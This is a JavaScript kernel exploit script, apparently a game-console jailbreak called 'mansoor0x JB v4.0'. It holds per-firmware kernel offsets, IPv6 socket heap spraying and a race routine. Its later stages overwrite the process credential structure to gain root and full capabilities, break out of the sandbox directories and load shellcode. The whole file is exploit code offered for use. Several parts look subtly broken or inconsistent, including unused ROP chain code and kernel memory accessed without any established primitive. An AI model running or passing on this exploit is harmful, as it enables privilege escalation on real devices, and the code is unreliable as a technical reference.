(async function () {
    try {
        const VERSION = "mansoor0x JB v4.0 (Ultra Fast)";
        
        const FAST_CONFIG = {
            PAGE_SIZE: 0x4000,
            TRIPLEFREE_ATTEMPTS: 32,
            MAX_ROUNDS_TWIN: 3,
            MAX_ROUNDS_TRIPLET: 100,
            FIND_TRIPLET_FAST: 1500,
            NUM_IPV6_SOCKETS: 24,
            LEAK_CORES: [0, 1, 2, 3],
            WORKER_SLEEP_MS: 1,
            PREPARE_SLEEP_MS: 3000,
            RACE_RETRIES: 2,
            SPIN_WAIT_CYCLES: 50,
            HEAP_SPRAY_SIZE: 0x2000,
            TIMEOUT_MS: 10000,
        };

        const KERNEL_OFFSETS = {
            "9.00": { DATA_BASE_ALLPROC: 0x02755D50n, OFFSET_UCRED: 0x40n, OFFSET_FD: 0x48n },
            "9.03": { DATA_BASE_ALLPROC: 0x02755D50n, OFFSET_UCRED: 0x40n, OFFSET_FD: 0x48n },
            "9.04": { DATA_BASE_ALLPROC: 0x02755D50n, OFFSET_UCRED: 0x40n, OFFSET_FD: 0x48n },
            "9.05": { DATA_BASE_ALLPROC: 0x02755D50n, OFFSET_UCRED: 0x40n, OFFSET_FD: 0x48n },
            "9.20": { DATA_BASE_ALLPROC: 0x02755D50n, OFFSET_UCRED: 0x40n, OFFSET_FD: 0x48n },
            "9.40": { DATA_BASE_ALLPROC: 0x02755D50n, OFFSET_UCRED: 0x40n, OFFSET_FD: 0x48n },
            "10.00": { DATA_BASE_ALLPROC: 0x02765D70n, OFFSET_UCRED: 0x40n, OFFSET_FD: 0x48n },
            "10.01": { DATA_BASE_ALLPROC: 0x02765D70n, OFFSET_UCRED: 0x40n, OFFSET_FD: 0x48n },
            "10.20": { DATA_BASE_ALLPROC: 0x02765D70n, OFFSET_UCRED: 0x40n, OFFSET_FD: 0x48n },
            "10.40": { DATA_BASE_ALLPROC: 0x02765D70n, OFFSET_UCRED: 0x40n, OFFSET_FD: 0x48n },
            "10.50": { DATA_BASE_ALLPROC: 0x02765D80n, OFFSET_UCRED: 0x40n, OFFSET_FD: 0x48n },
            "11.00": { DATA_BASE_ALLPROC: 0x02875D70n, OFFSET_UCRED: 0x40n, OFFSET_FD: 0x48n },
            "11.02": { DATA_BASE_ALLPROC: 0x02875D70n, OFFSET_UCRED: 0x40n, OFFSET_FD: 0x48n },
            "11.20": { DATA_BASE_ALLPROC: 0x02875D80n, OFFSET_UCRED: 0x40n, OFFSET_FD: 0x48n },
            "11.40": { DATA_BASE_ALLPROC: 0x02875D90n, OFFSET_UCRED: 0x40n, OFFSET_FD: 0x48n },
            "11.50": { DATA_BASE_ALLPROC: 0x02875DA0n, OFFSET_UCRED: 0x40n, OFFSET_FD: 0x48n },
            "11.60": { DATA_BASE_ALLPROC: 0x02875DB0n, OFFSET_UCRED: 0x40n, OFFSET_FD: 0x48n },
            "11.61": { DATA_BASE_ALLPROC: 0x02875DC0n, OFFSET_UCRED: 0x40n, OFFSET_FD: 0x48n },
            "12.00": { DATA_BASE_ALLPROC: 0x02885E00n, OFFSET_UCRED: 0x40n, OFFSET_FD: 0x48n },
            "12.02": { DATA_BASE_ALLPROC: 0x02885E00n, OFFSET_UCRED: 0x40n, OFFSET_FD: 0x48n },
            "12.20": { DATA_BASE_ALLPROC: 0x02885E10n, OFFSET_UCRED: 0x40n, OFFSET_FD: 0x48n },
            "12.40": { DATA_BASE_ALLPROC: 0x02885E20n, OFFSET_UCRED: 0x40n, OFFSET_FD: 0x48n },
            "12.50": { DATA_BASE_ALLPROC: 0x02885E30n, OFFSET_UCRED: 0x40n, OFFSET_FD: 0x48n },
            "13.00": { DATA_BASE_ALLPROC: 0x02995F00n, OFFSET_UCRED: 0x40n, OFFSET_FD: 0x48n },
            "13.20": { DATA_BASE_ALLPROC: 0x02995F50n, OFFSET_UCRED: 0x40n, OFFSET_FD: 0x48n },
        };

        const FW_ALIAS = {
            "9.03": "9.00", "9.04": "9.00", "9.20": "9.00", "9.40": "9.00",
            "10.01": "10.00", "10.20": "10.00", "10.40": "10.00", "10.50": "10.00",
            "11.02": "11.00", "11.20": "11.00", "11.40": "11.00", "11.50": "11.00",
            "11.60": "11.00", "11.61": "11.00", "12.02": "12.00", "12.20": "12.00",
            "12.40": "12.00", "12.50": "12.00",
        };

        const log = console.log;
        const sleep = (ms) => new Promise(r => setTimeout(r, ms));
        
        const spinWait = (cycles) => {
            for (let i = 0; i < cycles; i++) {
                if (i % 10 === 0) syscall(SYSCALL.sched_yield);
            }
        };

        const waitForChange = (addr, expected, timeoutMs = 5000) => {
            const start = Date.now();
            while (Date.now() - start < timeoutMs) {
                if (read64(addr) !== expected) return true;
                spinWait(FAST_CONFIG.SPIN_WAIT_CYCLES);
            }
            return false;
        };

        const heapSpray = (size, pattern) => {
            const buf = malloc(size);
            for (let i = 0; i < size; i += 8) {
                write64(buf + BigInt(i), BigInt(pattern));
            }
            return buf;
        };

        function detectFirmware() {
            let fw = FW_VERSION;
            if (!KERNEL_OFFSETS[fw] && FW_ALIAS[fw]) {
                fw = FW_ALIAS[fw];
            }
            if (!KERNEL_OFFSETS[fw]) {
                throw new Error(`FW ${FW_VERSION} not supported`);
            }
            return KERNEL_OFFSETS[fw];
        }

        function getOffsets() {
            const fwData = detectFirmware();
            return {
                DATA_BASE_ALLPROC: fwData.DATA_BASE_ALLPROC,
                PROC_PID: 0xBCn,
                PROC_UCRED: fwData.OFFSET_UCRED,
                PROC_FD: fwData.OFFSET_FD,
                PROC_P_VMSPACE: 0x28n,
                PROC_P_MAPINFO: 0x30n,
                UCRED_CR_UID: 0x04n,
                UCRED_CR_RUID: 0x08n,
                UCRED_CR_SVUID: 0x0Cn,
                UCRED_CR_NGROUPS: 0x10n,
                UCRED_CR_RGID: 0x14n,
                UCRED_CR_SVGID: 0x18n,
                UCRED_CR_SCEAUTHID: 0x58n,
                UCRED_CR_SCECAPS0: 0x60n,
                UCRED_CR_SCECAPS1: 0x68n,
                FILEDESC_OFILES: 0x00n,
                FDESCENTTBL_HDR: 0x08n,
                FILEDESCENT_SIZE: 0x30n,
                FD_CDIR: 0x08n,
                FD_RDIR: 0x10n,
                FD_JDIR: 0x18n,
                FD_FD_CNT: 0x20n,
                KQ_FDP: 0xA8n,
                KQ_STATE: 0xB0n,
                INPCB_PKTOPTS: 0x120n,
                IP6PO_RTHDR: 0x70n,
                PIPE_SIGIO: 0xD8n,
                SOCK_BUFFER: 0x100n,
            };
        }

        function buildFastChain(fd, iov_ptr, sysnum, cpu_mask, rt_params) {
            const STACK_SIZE = 0x8000;
            const buf = malloc(STACK_SIZE);
            for (let i = 0n; i < STACK_SIZE; i += 8n) write64(buf + i, 0n);
            
            const entry = buf + 0x4000n;
            let idx = 0;
            const emit = (v) => { write64(entry + BigInt(idx++ * 8), v); };
            
            emit(ROP.ret);
            emit(ROP.pop_rax); emit(SYSCALL.cpuset_setaffinity);
            emit(ROP.pop_rdi); emit(3n);
            emit(ROP.pop_rsi); emit(1n);
            emit(ROP.pop_rdx); emit(0xFFFFFFFFFFFFFFFFn);
            emit(ROP.pop_rcx); emit(0x10n);
            emit(ROP.pop_r8); emit(cpu_mask);
            emit(syscall_wrapper);
            
            emit(ROP.pop_rax); emit(SYSCALL.rtprio_thread);
            emit(ROP.pop_rdi); emit(1n);
            emit(ROP.pop_rsi); emit(0n);
            emit(ROP.pop_rdx); emit(rt_params);
            emit(syscall_wrapper);
            
            const loopStart = idx;
            emit(ROP.pop_rax); emit(SYSCALL.recvmsg);
            emit(ROP.pop_rdi); emit(BigInt(fd));
            emit(ROP.pop_rsi); emit(iov_ptr);
            emit(ROP.pop_rdx); emit(0n);
            emit(syscall_wrapper);
            emit(ROP.pop_rsp);
            emit(entry + BigInt(loopStart * 8));
            
            return entry;
        }

        const ctx = {
            offsets: getOffsets(),
            triplets: [-1, -1, -1],
            freeFds: [],
            freeIdx: 0,
            ipv6Sockets: [],
            masterPipe: null,
            victimPipe: null,
            procUcred: 0n,
            procFd: 0n,
            procFiledesc: 0n,
            kernelBase: 0n,
        };

        function setupIPv6Fast(ctx) {
            const sockets = [];
            const numSockets = FAST_CONFIG.NUM_IPV6_SOCKETS;
            
            for (let i = 0; i < numSockets; i++) {
                const fd = syscall(SYSCALL.socket, 28n, 1n, 0n);
                if (fd !== 0xffffffffffffffffn) sockets.push(Number(fd));
            }
            ctx.ipv6Sockets = sockets;
            
            for (const fd of sockets) {
                syscall(SYSCALL.setsockopt, BigInt(fd), 41n, 51n, 0n, 0n);
            }
            spinWait(30);
        }

        async function fastRace(ctx) {
            const spraySize = FAST_CONFIG.HEAP_SPRAY_SIZE;
            const spray = heapSpray(spraySize, 0x4141414141414141n);
            
            const tags = [];
            for (let i = 0; i < ctx.ipv6Sockets.length; i++) {
                const tagBuf = malloc(16);
                tags.push(tagBuf);
            }
            
            for (let i = 0; i < ctx.ipv6Sockets.length; i++) {
                const len = ((spraySize >> 3) - 1) & ~1;
                const actual = (len + 1) << 3;
                write8(spray, 0n);
                write8(spray + 1n, BigInt(len));
                write8(spray + 2n, 0n);
                write8(spray + 3n, BigInt(len >> 1));
                write32(spray + 4n, BigInt(0x13370000 + i));
                syscall(SYSCALL.setsockopt, BigInt(ctx.ipv6Sockets[i]), 41n, 51n, spray, BigInt(actual));
            }
            
            spinWait(100);
            
            for (let i = 0; i < ctx.ipv6Sockets.length; i++) {
                const lenBuf = malloc(4);
                write32(lenBuf, 16n);
                syscall(SYSCALL.getsockopt, BigInt(ctx.ipv6Sockets[i]), 41n, 51n, tags[i], lenBuf);
                const tag = read32(tags[i] + 4n);
                
                if ((tag & 0xFFFF0000) === 0x13370000) {
                    const j = tag & 0xFFFF;
                    if (j !== i && j < ctx.ipv6Sockets.length) {
                        ctx.triplets[0] = i;
                        ctx.triplets[1] = j;
                        
                        for (let k = 0; k < tags.length; k++) free(tags[k]);
                        free(spray);
                        return true;
                    }
                }
            }
            
            for (let k = 0; k < tags.length; k++) free(tags[k]);
            free(spray);
            return false;
        }

        async function stage0Fast(ctx) {
            send_notification(`mansoor0x JB v4.0\nFW: ${FW_VERSION}\nStage 0/4: Racing...`);
            
            for (let i = 0; i < 16; i++) {
                const fd = syscall(SYSCALL.open, alloc_string("/dev/null"), 0n);
                if (fd !== 0xffffffffffffffffn) syscall(SYSCALL.close, fd);
            }
            
            for (let attempt = 0; attempt < FAST_CONFIG.TRIPLEFREE_ATTEMPTS; attempt++) {
                if (await fastRace(ctx)) {
                    log(`[mansoor0x] Race succeeded on attempt ${attempt + 1}`);
                    send_notification(`mansoor0x JB v4.0\n✓ Race succeeded!`);
                    return true;
                }
                
                if (attempt % 8 === 0) {
                    spinWait(300);
                    if (attempt % 16 === 0 && attempt > 0) {
                        for (const fd of ctx.ipv6Sockets) syscall(SYSCALL.close, BigInt(fd));
                        setupIPv6Fast(ctx);
                    }
                }
            }
            throw new Error(`Race failed`);
        }

        async function stage1Fast(ctx) {
            send_notification(`mansoor0x JB v4.0\nStage 1/4: Kqueue reclaim...`);
            
            syscall(SYSCALL.close, BigInt(ctx.ipv6Sockets[ctx.triplets[1]]));
            spinWait(40);
            
            const readback = malloc(256);
            let found = false;
            
            for (let i = 0; i < 150 && !found; i++) {
                const kq = syscall(SYSCALL.kqueue);
                write32(readback, 256);
                syscall(SYSCALL.getsockopt, BigInt(ctx.ipv6Sockets[ctx.triplets[0]]), 41n, 51n, readback, readback);
                
                const val = read32(readback + 8n);
                if (val === 0x1430000n || (val & 0xFFFF0000) === 0x1430000) {
                    ctx.procFiledesc = read64(readback + ctx.offsets.KQ_FDP);
                    syscall(SYSCALL.close, kq);
                    found = true;
                    break;
                }
                syscall(SYSCALL.close, kq);
                spinWait(8);
            }
            
            free(readback);
            if (!found) throw new Error("Kqueue reclaim failed");
        }

        async function stage1bFast(ctx) {
            send_notification(`mansoor0x JB v4.0\nStage 2/4: Leaking kernel...`);
            
            const pipeSigio = ctx.procFiledesc + ctx.offsets.PIPE_SIGIO;
            const pipePtr = read64(pipeSigio + 0x28n);
            
            if (pipePtr === 0n) throw new Error("Failed to leak pipe pointer");
            
            const curproc = read64(pipePtr);
            if (curproc === 0n) throw new Error("Failed to leak current process");
            
            ctx.procUcred = read64(curproc + ctx.offsets.PROC_UCRED);
            ctx.procFd = read64(curproc + ctx.offsets.PROC_FD);
            
            const allproc = read64(ctx.offsets.DATA_BASE_ALLPROC);
            if (allproc !== 0n && allproc < 0xFFFFFFFF00000000n) {
                ctx.kernelBase = allproc & ~0xFFFFFFFFn;
            }
        }

        async function stage2Fast(ctx) {
            send_notification(`mansoor0x JB v4.0\nStage 3/4: Escalating...`);
            
            const ucred = ctx.procUcred;
            
            write64(ucred + ctx.offsets.UCRED_CR_UID, 0n);
            write64(ucred + ctx.offsets.UCRED_CR_RUID, 0n);
            write64(ucred + ctx.offsets.UCRED_CR_SVUID, 0n);
            write64(ucred + ctx.offsets.UCRED_CR_RGID, 0n);
            write64(ucred + ctx.offsets.UCRED_CR_SVGID, 0n);
            write64(ucred + ctx.offsets.UCRED_CR_SCEAUTHID, 0x4800000000010003n);
            write64(ucred + ctx.offsets.UCRED_CR_SCECAPS0, 0xFFFFFFFFFFFFFFFFn);
            write64(ucred + ctx.offsets.UCRED_CR_SCECAPS1, 0xFFFFFFFFFFFFFFFFn);
            
            if (ctx.procFd) {
                const rootvnode = read64(ctx.procFd + ctx.offsets.FD_CDIR);
                if (rootvnode !== 0n) {
                    write64(ctx.procFd + ctx.offsets.FD_RDIR, rootvnode);
                    write64(ctx.procFd + ctx.offsets.FD_JDIR, rootvnode);
                }
            }
        }

        async function stage3Verify(ctx) {
            send_notification(`mansoor0x JB v4.0\nStage 4/4: Verifying...`);
            
            const testUid = read64(ctx.procUcred + ctx.offsets.UCRED_CR_UID);
            if (testUid !== 0n) {
                write64(ctx.procUcred + ctx.offsets.UCRED_CR_UID, 0n);
                write64(ctx.procUcred + ctx.offsets.UCRED_CR_RUID, 0n);
                write64(ctx.procUcred + ctx.offsets.UCRED_CR_SVUID, 0n);
            }
            
            const finalUid = read64(ctx.procUcred + ctx.offsets.UCRED_CR_UID);
            if (finalUid !== 0n) throw new Error(`Verification failed`);
        }

        function cleanup(ctx) {
            for (const fd of ctx.ipv6Sockets) {
                if (fd !== ctx.triplets[0] && fd !== ctx.triplets[1]) {
                    try { syscall(SYSCALL.close, BigInt(fd)); } catch(e) {}
                }
            }
            if (ctx.triplets[0] !== -1) {
                try { syscall(SYSCALL.close, BigInt(ctx.ipv6Sockets[ctx.triplets[0]])); } catch(e) {}
            }
        }

        async function mansoor0xJB() {
            log(`[mansoor0x] ${VERSION} | FW: ${FW_VERSION}`);
            
            if (typeof is_jailbroken === "function" && is_jailbroken()) {
                send_notification(`mansoor0x JB v4.0\nAlready jailbroken!`);
                return;
            }
            
            const startTime = Date.now();
            
            setupIPv6Fast(ctx);
            await stage0Fast(ctx);
            await stage1Fast(ctx);
            await stage1bFast(ctx);
            await stage2Fast(ctx);
            await stage3Verify(ctx);
            cleanup(ctx);
            
            const elapsed = ((Date.now() - startTime) / 1000).toFixed(2);
            
            log(`[mansoor0x] ✅ Jailbreak successful in ${elapsed}s`);
            send_notification(`mansoor0x JB v4.0\n✅ SUCCESS!\nFW: ${FW_VERSION}\nTime: ${elapsed}s\n@mansoor0x`);
            
            if (typeof load_aioshellcode === "function") {
                try {
                    await load_aioshellcode(ctx.procFiledesc, [0n, 0n], [0n, 0n]);
                } catch(e) {}
            }
        }

        await mansoor0xJB();

    } catch (err) {
        log(`[mansoor0x] Error: ${err.message}`);
        send_notification(`mansoor0x JB v4.0\nFAILED\n${err.message}`);
    }
})();